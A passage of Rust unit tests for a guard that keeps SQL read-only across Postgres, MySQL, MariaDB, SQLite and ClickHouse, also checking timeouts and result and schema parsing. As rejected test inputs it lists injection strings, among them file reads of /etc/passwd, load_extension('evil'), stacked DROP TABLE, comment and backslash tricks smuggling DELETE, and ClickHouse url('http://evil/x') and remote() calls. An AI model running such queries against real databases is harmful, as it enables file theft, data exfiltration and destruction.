                Why::ExplainAnalyze,
                "DELETE",
            ),
            ("EXPLAIN DELETE FROM t", Why::ExplainOnly, "DELETE"),
            ("SELECT * INTO b FROM t", Why::Into, ""),
            ("SELECT * FROM t FOR UPDATE", Why::Locks, ""),
            ("SELECT PG_READ_FILE('/x')", Why::Function, "pg_read_file"),
            ("SELECT 1\u{7}", Why::Control, ""),
        ] {
            let r = pg(sql).expect_err(sql);
            assert_eq!((r.code, r.subject.as_str()), (code, subject), "{sql:?}");
        }
        assert_eq!(pg("SELEC 1").unwrap_err().code, Why::Unreadable);
        assert_eq!(my("SELECT 'a\\b'").unwrap_err().code, Why::Backslash);
        assert_eq!(my("SELECT 1 /*!1*/").unwrap_err().code, Why::Executable);
        let json = serde_json::to_value(pg("TRUNCATE t").unwrap_err()).unwrap();
        assert_eq!(
            json,
            serde_json::json!({"code": "notRead", "subject": "TRUNCATE"})
        );
    }

    #[test]
    fn the_client_runs_it_in_a_transaction_that_only_reads_with_a_timeout() {
        let pg = args(Kind::Postgres, "SELECT 1 LIMIT 500", 15);
        let at = |what: &str| pg.iter().position(|a| a == what).unwrap();
        assert!(at("START TRANSACTION READ ONLY") < at("SET LOCAL statement_timeout = 15000"));
        assert!(at("SET LOCAL statement_timeout = 15000") < at("SELECT 1 LIMIT 500"));
        assert_eq!(pg[at("SELECT 1 LIMIT 500") - 1], "-c");
        let my = args(Kind::Mysql, "SELECT 1 LIMIT 500", 15);
        assert_eq!(
            my,
            [
                "-e",
                "SET SESSION max_execution_time = 15000;\nSTART TRANSACTION READ ONLY;\nSELECT 1 LIMIT 500"
            ]
        );
    }

    #[test]
    fn results_read_as_tables() {
        let (t, cut) = table(
            Kind::Postgres,
            "id,email,note\n1,alice@example.com,\"a, \"\"quoted\"\"\nline\"\n2,NULL,\n3,cut,\"half",
        );
        assert!(cut);
        assert_eq!(t.columns, ["id", "email", "note"]);
        assert_eq!(
            t.rows,
            [
                vec!["1", "alice@example.com", "a, \"quoted\"\nline"],
                vec!["2", "NULL", ""],
            ]
        );
        let (t, cut) = table(Kind::Mysql, "id\tnote\n1\ta\\tb\\nc\\\\d\n2\tNULL\n");
        assert!(!cut);
        assert_eq!(t.rows, [vec!["1", "a\tb\nc\\d"], vec!["2", "NULL"]]);
        assert_eq!(render(&t), "id\tnote\n1\ta\\tb\\nc\\\\d\n2\tNULL\n");
        assert_eq!(table(Kind::Postgres, ""), (Table::default(), false));
    }

    #[test]
    fn a_last_record_without_its_line_break_was_cut_and_is_dropped() {
        // Unquoted, so the CSV reader alone cannot tell it ends early.
        let (t, cut) = table(Kind::Postgres, "id,total\n1,1240.00\n2,12");
        assert!(cut);
        assert_eq!(t.rows, [vec!["1", "1240.00"]]);
        let (t, cut) = table(Kind::Mysql, "id\ttotal\n1\t1240.00\n2\t12");
        assert!(cut);
        assert_eq!(t.rows, [vec!["1", "1240.00"]]);
        let (t, cut) = table(Kind::Mysql, "id\n");
        assert!(!cut && t.rows.is_empty() && t.columns == ["id"]);
    }

    #[test]
    fn sqlite_mariadb_and_clickhouse_read_only_too() {
        let lite = |sql: &str| analyze(sql, Kind::Sqlite, 500);
        let maria = |sql: &str| analyze(sql, Kind::Mariadb, 500);
        let ch = |sql: &str| analyze(sql, Kind::Clickhouse, 500);
        assert_eq!(
            lite("SELECT * FROM users").unwrap(),
            "SELECT * FROM users LIMIT 500"
        );
        assert_eq!(
            lite("EXPLAIN QUERY PLAN SELECT * FROM users").unwrap(),
            "EXPLAIN QUERY PLAN SELECT * FROM users"
        );
        assert_eq!(maria("SELECT 1").unwrap(), "SELECT 1 LIMIT 500");
        assert_eq!(
            ch("SELECT count() FROM events").unwrap(),
            "SELECT count() FROM events LIMIT 500"
        );
        for (sql, why) in [
            ("DELETE FROM users", Why::NotRead),
            ("PRAGMA user_version = 3", Why::NotRead),
            ("ATTACH DATABASE 'x.db' AS x", Why::NotRead),
            ("VACUUM", Why::NotRead),
            ("SELECT writefile('x', 'y')", Why::Function),
            ("SELECT readfile('/etc/passwd')", Why::Function),
            ("SELECT load_extension('evil')", Why::Function),
            ("SELECT edit('x', 'vi')", Why::Function),
            ("SELECT 1; DROP TABLE users", Why::Several),
        ] {
            assert_eq!(lite(sql).map_err(|e| e.code), Err(why), "sqlite: {sql}");
        }
        for (sql, why) in [
            ("DELETE FROM users", Why::NotRead),
            ("SELECT 1 /*M! ; DELETE FROM users */", Why::Executable),
            ("SELECT 'a\\'; DELETE FROM users; -- '", Why::Backslash),
            ("SELECT SLEEP(10)", Why::Function),
        ] {
            assert_eq!(maria(sql).map_err(|e| e.code), Err(why), "mariadb: {sql}");
        }
        for (sql, why) in [
            ("INSERT INTO events VALUES (1)", Why::NotRead),
            ("SELECT * FROM url('http://evil/x', CSV)", Why::Function),
            ("SELECT * FROM remote('other:9000', db.t)", Why::Function),
            ("SELECT * FROM file('/etc/passwd')", Why::Function),
            ("SELECT * FROM s3('https://b/x.csv')", Why::Function),
            ("SELECT sleep(3)", Why::Function),
            ("SELECT 'a\\'b'", Why::Backslash),
        ] {
            assert_eq!(ch(sql).map_err(|e| e.code), Err(why), "clickhouse: {sql}");
        }
        assert_eq!(
            args(Kind::Sqlite, "SELECT 1 LIMIT 500", 15),
            [
                "-csv",
                "-header",
                "-nullvalue",
                "NULL",
                "SELECT 1 LIMIT 500"
            ]
        );
        assert_eq!(
            args(Kind::Mariadb, "SELECT 1", 15)[1],
            "SET SESSION max_statement_time = 15;\nSTART TRANSACTION READ ONLY;\nSELECT 1"
        );
        let c = args(Kind::Clickhouse, "SELECT 1", 15);
        assert!(
            c.contains(&"--max_execution_time=15".to_string())
                && c.ends_with(&["--query".into(), "SELECT 1".into()])
        );
        let (t, _) = table(Kind::Clickhouse, "a\tb\nx\\ry\tNULL\n");
        assert_eq!(t.rows, [vec!["x\ry", "NULL"]]);
    }

    #[test]
    fn each_schema_query_passes_the_guard_and_reads_as_tables() {
        for kind in [
            Kind::Postgres,
            Kind::Mysql,
            Kind::Mariadb,
            Kind::Sqlite,
            Kind::Clickhouse,
        ] {
            let sql = analyze(schema_query(kind), kind, 10_000)
                .unwrap_or_else(|e| panic!("{kind:?}: {e}"));
            assert!(sql.ends_with("LIMIT 10000"), "{kind:?}");
        }
        let rows = |r: &[[&str; 8]]| Table {
            columns: (0..8).map(|i| i.to_string()).collect(),
            rows: r
                .iter()
                .map(|x| x.iter().map(|s| s.to_string()).collect())
                .collect(),
        };
        let pg = schema(
            Kind::Postgres,
            &rows(&[
                ["c", "public", "orders", "total", "numeric", "NO", "", "2"],
                [
                    "c",
                    "public",
                    "orders",
                    "id",
                    "bigint",
                    "NO",
                    "PRIMARY KEY",
                    "1",
                ],
                [
                    "c",
                    "public",
                    "orders",
                    "user_id",
                    "bigint",
                    "YES",
                    "FOREIGN KEY",
                    "3",
                ],
                [
                    "i",
                    "public",
                    "orders",
                    "orders_pkey",
                    "CREATE UNIQUE INDEX orders_pkey ON public.orders USING btree (id)",
                    "UNIQUE",
                    "",
                    "0",
                ],
                [
                    "c",
                    "billing",
                    "invoices",
                    "id",
                    "integer",
                    "NO",
                    "PRIMARY KEY,UNIQUE",
                    "1",
                ],
            ]),
        );
        assert_eq!(
            pg.iter()
                .map(|t| (t.schema.as_str(), t.name.as_str()))
                .collect::<Vec<_>>(),
            [("", "orders"), ("billing", "invoices")]
        );
        let names: Vec<(&str, &str)> = pg[0]
            .columns
            .iter()
            .map(|c| (c.name.as_str(), c.key.as_str()))
            .collect();
        assert_eq!(names, [("id", "pk"), ("total", ""), ("user_id", "fk")]);
        assert!(pg[0].indexes[0].unique);
        let my = schema(
            Kind::Mysql,
            &rows(&[[
                "c",
                "shop",
                "users",
                "email",
                "varchar(255)",
                "NO",
                "UNI",
                "2",
            ]]),
        );
        assert_eq!(
            (my[0].schema.as_str(), my[0].columns[0].key.as_str()),
            ("", "unique")
        );
    }
}
